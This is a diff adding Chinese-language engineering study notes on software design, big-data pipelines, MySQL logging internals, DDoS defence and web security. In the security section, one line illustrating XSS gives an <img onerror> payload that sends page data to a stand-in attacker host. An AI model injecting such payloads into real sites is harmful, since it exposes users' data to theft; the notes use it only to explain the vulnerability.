@@ -428,22 +428,107 @@
 	   >分布式链路追踪：集群的调用链分析工具。TCPdump/strace/ltrace/btrace/housemd;;;jmap/pmap/jstack/gbd
 	  >解决：重启、回滚、扩容、降级、迁移。(打印日志时加上线程id?) 框架和逻辑分离，增加逻辑不用改代码。
 	  >日志方案：Scribe, logstash
-	 >代码要有组织：解耦、分层。不仅仅是entity/controller/model/service/util这种。而且要factory/proxy/template/builder/observer等, 抽象、接口编程、泛型编程。通用性更强，扩展更简单，代价已经最低。高内聚低耦合
+	 >代码要有组织：解耦、分层。不仅仅是entity/controller/model/service/util这种。而且要factory/proxy/template/builder/observer/adapter/wrapper等, 抽象、接口编程、泛型编程。通用性更强，扩展更简单，代价已经最低。高内聚低耦合
 	  >c++之父：整洁的代码只做一件事。逻辑应该是清晰的，bug难以隐藏。依赖最少，易于维护。性能接近最佳化，避免代码混乱。
 	  >没有明显的需要改善的地方。代码的作者似乎考虑了所有的事情。 
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
-	
+	 >看一个新的项目：先看功能说明-架构-时序泳道。再quickstart ,再看接口定义， 再看接口的实现。
+	  >一个模块的单元测试覆盖率：>50%才可以。代表异常情况的处理代码分支有被覆盖。Spock框架进行单元测试。
+	  >并发编程：同步策略+保护共享资源
+	  >日志：不只是在异常上，而是在方法入口，出口和中间关键节点上都要有。
+	  >一个函数的调用方：如果几十处，那么可能是耦合度太高。
+	  >性能优化：要对比可读性和看到收益。优化方法：减少复杂绕弯的路径、减少重复操作、无用操作；并行编程；优化算法复杂度；计算靠近存储。
+	  >Jekins+SonarQube完成基本流程。
+	 >大数据平台：数据采集、接入、清洗、存储计算、数据挖掘、可视化。
+	  >设计为：快速的采集、分析，从大量的多类别的数据中提取出价值，存储挖掘分析。营销、企业管理、对情报分析有用。
+	  >某音乐公司：实时个性化推荐系统、RTB系统、实时预警系统
+	   >第一代：hadoop+hive+sqoop离线计算：
+	    >通过rsync同步文件：实时流计算不行。Kettle来全量同步业务数据到数据中心。
+		>作业调度：crontab
+	   >第二代：app等端采集数据-->上传到kafka集群--->Storm清洗/ETL实时清洗--->kafka集群---->storm实时计算/ESPer--->Druid--->数据服务--->实时监控/推荐
+					数据源			数据接入			数据清洗 数据缓存		存储计算				 数据服务 		数据消费。 每个环节高可用、可扩展。且被数据质量监控系统监控，				
+				mysql binlog --->Canal增量同步 --> HDFS/SPARK/SparkSQL/SparkMLib--->KG-Camus--->kafka集群 数据缓存-->
+		>数据接入：未使用flume/Scribe, 而是直接接入kafka(正常和容错topic), Nginx+Lua而把nginx上的日志上传到kafka
+		>hadoop对os内存申请效率修改的建议：或许要关闭内核系统THP特性：/sys/kernel/mm/redhat_transparent_hugepage/enabled-defrag
+		>hdfs的长连接有问题：断。kg-camus可以良好的写入,是kafka的消费者，hdfs的写入者。
+	    >hive row_number() over有问题。
+		>列式存储性能好的：ORCFile, Parquet
+		>分布式内存文件系统：Tachyon
+	 >实时计算：
+	  >阿里：JStorm, 360Storm;TDProcess,
+	  >考虑的问题1：如何获取、传输、计算、存储、对外服务/消费。
+	   >封装对应的数据输入源：Spout
+	   >批量从业务方拿到日志做到数据的一致性和完整性：类似Kafka系统。
+	   >实时拿到mysql数据库的update/delete/insert: 以mysql binlog 为基础开发的。Puma
+	  >流程：数据源：mysql binlog, 业务系统日志,nginx日志--->类kafka系统--->storm计算--->redis/hbase/mysql存储(根据SLA服务等级协议切换)---->数据服务--->推荐/搜索/dashboard
+	  >Storm: 可以非常容易地、可靠地处理无限的数据流。实时的、分布式的、具备高容错的计算系统。在Storm上运行Topology
+	   >kafka/mq ---> Spout--->Topology.Blot	execute(用户操作) 。。采用ack机制保证数据不丢失，采用事务机制保证数据的正确性。DisruptorQueue/Netty
+	  >资源隔离：cpu/mem不同业务在同一个机器上使用的，要隔离开，避免互相影响，占用太多资源。CGroup
+	  >主机维度的监控：Ganglia实时的集群网络负载。
+	  >无状态设计、无锁设计、水平扩展支持。
+	  >吞吐量和延迟矛盾。性能的瓶颈在热点。
+	  >Hadoop/Hive:专注离线分析；Storm实时。SparkStreaming+SparkSQL做中间的缓冲
+	  >没有使用事务：需要考虑业务的幂等问题。
+	  >写文件：写Page Cache降低磁盘I/O
+	 >HDFS和Yarn:
+	  >HDFS支持的存储介质：磁盘、内存、SSD、高密度存储但耗电少ARCHIVE
+	   >存储策略：all, one, hot, warm, cold
+	   >异构存储：Tachyon
+	  >YARN统一管理异构存储介质和资源：磁盘、网络、CPU、内存、SSD, 将资源分配给MR,HBase, HDFS。。。Mesos也是一种分布式资源管理系统。
+	  >HydraBase是FaceBook内部维护的HBase版本(写性能可能不如)，99.999%可用率。Raft协议管理Region Server。 Cloudera Kudu使用Raft协议管理Tablet
+	 >SQL-On-Hadoop引擎：Apache HAWQ原生大规模并行SQL分析引擎。比Hive/Impala更好
+	  >支持ACID事务特性：
+	  >动态数据流引擎：基于UDP的高速互联网络。
+	  >MPP: 大规模并行处理系统。	
+	  >架构：HAWQ Master --- Segment(物理/虚拟)
+	   >元数据服务：实现分布式事务的关键。
+	   >高速互联网络：基于UDP。节点之间传输数据。百万连接。
+	  >过程：查询解析器解析SQL得到查询树-->优化器得出执行计划--->分派器查询资源管理器ResourceManager得到资源，分解查询计划对应到资源--->派遣各个查询计划到Segement的执行器上执行---->结果传回用户。
+	  >事务隔离：Snapshot Isolation除了串行化不支持其他都支持。
+	 >PostgreSQL数据库：OLTP使用多。join多适用。 
+	  >主备切换：Streaming Replication; HA结构：Corosync+Pacemaker
+	  >MySQL Proxy负载均衡中间件。MMA解决方案。
+	 >NewSQL：DRDS按需扩容承载更大的访问量和更大的数据量, 不仅承载而且性能好,开发容易,硬件成本低.
+	  >查询解析：生成AST树。包括 where 部分 , fromlist, resultlist等部分。
+	  >生成执行计划：AST树+索引源信息：索引源信息如索引的区分度,二级索引类似一个倒排索引。
+	  >分布式系统:强一致性带来延迟提高,因为网络通信代价高,使得单次提交延迟,进而数据库锁持有时间更长,使得高冲突条件下分布式事务性能不升反降.
+	   >无需事务和SQL的场景:日志流水的记录和分析.
+	   >join底层: hash/index nest loop/sort merge
+	  >redolog: innodb引擎的重做日志: 物理日志,记录更新的内容(成功的事务修改).保证事务的持久性.防止发生故障的时间点,尚有脏页未写入磁盘.重启mysql的时候根据redolog重做.日志空间固定大小,循环写; 比如有4个文件,checkpoint指向文件中的一处,write pos 指向文件中的另一处,checkoupoint之前的就是已经持久化到磁盘了的,如果两个指针值相等就会触发redolog持久化同步写入磁盘;更新操作先更新到redolog再更新到内存,内存定期写入磁盘数据文件.
+	  >undolog: 保存了事务发生之前的数据的一个版本.即上一次成功的事务的内容;
+	  >binlog: 服务层产生的日志: 逻辑日志,记录更新语句原始逻辑.且一个修改先写redolog-prepare状态,然后返回写入binlog,然后更新刚写入的redolog设置为commit状态.空间任意大,写完一份开始下一份,追加写.
+	  >datafile: 数据文件;同时在内存中有缓存:.事务成功则在redolog一定记录了,而所在页数据可能还在内存中没有持久化到磁盘datafile--因为这个持久化可能是一个随机写,性能差;不像redolog/undolog/binlog是顺序写-比内存顺序写差不了多少;
+	   >提交事务的过程:先写到undo日志的log buffer, 再写入redolog的log buffer, 再刷新内存数据,再返回服务层刷入binlog, 再设置redolog 事务提交成功;再返回客户端;如果innodb_flush_log_at_trx_commit=1则直接将redolog的logbuffer写入redolog file刷新落盘;..先持久化日志的策略就叫WAL
+	   >注意和查询缓存query cache区分,一个是引擎级别,一个是服务层级别;8.0以后官方移除---因为效果不好:访问的时候需要获取一个全局锁.
+	   >crash-safe
+	  >Innodb层核心:拆分各种锁,提高并发.如不为只读事务分配事务ID,..R Tree
+	   >并行复制:logic-lock; group replication(支持全同步);;;;;online-DDL , pt-osc
+	   >读写分离中间件:MyCAT, Atlas,Vitess
+	   >备份:周备.binlog. 使用xtrabackup备份的数据可靠性还可以.
+	 >Spark: MongoDB读多写少failover读写分离
+	  >DataFrame, SQL: 直接二进制格式进行计算.避免序列化和反序列化.
+	 >分布式DDos系统:腾讯大禹. 分布式拒绝服务
+	  >DDos检测和清洗算法:
+	  >动态切入大禹系统:接入和离开.接入会100ms延迟.
+	  >流量特征:大量TCP SYN包,..攻击类型NTP反射.
+	  >策略:OSPF分流,服务降级\过载保护\修改内核部分数据流向
+	  >云盾:机房的防火墙.
+	 >DNS高可用: 认识到有多方面,且多方面需要配合.成功是配合的结果
+	  >HttpDNS: 防止DNS劫持. 黑客修改路由器的默认DNS地址.
+	  >Http劫持:
+	  >sendfile的缺点:大文件的发送:.nginx采用定长buffer来切割磁盘I/O,避免单个请求占用太多磁盘I/O
+	  >磁盘调度算法:
+	  >优化文件存储结构:
+	  >盗链:
+	  >p2p穿墙打洞:
+	 >互联网安全威胁:
+	  >XSS漏洞: 跨站脚本. 就是输入框的值 如果输入一段Html脚本也能成功放到页面上,那么就会执行这个输入值,如果是一幅图片的<img src, onerror="new Image().src=https://evil.example.com/...">还会触发访问另一个网址-----带上数据访问就泄漏数据了..
+	   >比如注册时:name写为<img src=""> 之类的,然后在前端展示时,就反而会加载其他js进来.
+	  >SQL注入: 字符串拼接sql导致的.
+	  >CSRF: 跨站点请求伪造:
+	  >HSTS/HPKP: 安全
+	 >HTTPS走CDN: 第三方域名\Keyless\   ...<<白帽子讲Web安全>>
+	  
+	  
  --反问他技术挑战在哪里?去年年终发了多少？
  -- 不必技术慌张，因为使用的基本元素自己都知道都懂。
  -- 独当一面，心病。意味着不能靠任何提示而做出来。从开发到需求。	
@@ -452,3 +537,4 @@
  
  
 参考资料：编程珠玑..。。allthingsdistributed(无服务器构建，什么都用云上的)
+http://coding-geek.com/how-databases-work/(join的底层原理)
